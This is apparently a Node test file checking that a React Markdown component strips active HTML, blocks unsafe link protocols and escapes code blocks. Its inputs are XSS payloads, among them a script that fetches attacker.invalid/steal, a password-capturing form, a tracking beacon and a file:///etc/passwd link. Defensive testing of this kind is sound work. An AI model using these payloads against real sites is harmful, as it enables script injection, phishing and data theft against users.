import assert from "node:assert/strict";
import { test } from "node:test";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { StudyText } from "../src/components/question-materials";

test("untrusted question, reference and feedback Markdown never renders active HTML", () => {
  for (const text of [
    '<script>fetch("https://attacker.invalid/steal")</script>',
    '<img src=x onerror="alert(1)">',
    '<svg><a href="javascript:alert(1)">run</a></svg>',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<form action="https://attacker.invalid"><input name="password"></form>',
    '<style>body{background:url(https://attacker.invalid/track)}</style>',
    '<object data="https://attacker.invalid/active.svg"></object>',
  ]) {
    const html = renderToStaticMarkup(createElement(StudyText, { text }));
    assert.doesNotMatch(html, /<(?:script|img|svg|iframe|form|input|style|object)\b/i);
  }
});

test("Markdown protocols cannot create executable or local-file links or third-party image beacons", () => {
  for (const destination of ["javascript:alert%281%29", "JaVaScRiPt:alert%281%29", "data:text/html;base64,PHNjcmlwdD4=", "vbscript:msgbox%281%29", "file:///etc/passwd", "//attacker.invalid/path"]) {
    const html = renderToStaticMarkup(createElement(StudyText, { text: `[open](${destination})\n\n![beacon](https://attacker.invalid/pixel)` }));
    assert.doesNotMatch(html, /href=|<img\b/i);
  }
});

test("ordinary HTTPS references remain usable with no referrer and no opener access", () => {
  const html = renderToStaticMarkup(createElement(StudyText, { text: "[documentation](https://example.com/guide?q=test&section=1)" }));
  assert.match(html, /href="https:\/\/example.com\/guide\?q=test&amp;section=1"/);
  assert.match(html, /target="_blank" rel="noreferrer"/);
});

test("HTML payloads in fenced source are escaped and remain readable instead of executing", () => {
  const html = renderToStaticMarkup(createElement(StudyText, { text: '```html\n<img src=x onerror="alert(1)">\n<script>alert(1)</script>\n```' }));
  assert.doesNotMatch(html, /<img\b|<script\b/);
  assert.match(html, /&lt;img/);
  assert.match(html, /&lt;script&gt;/);
});
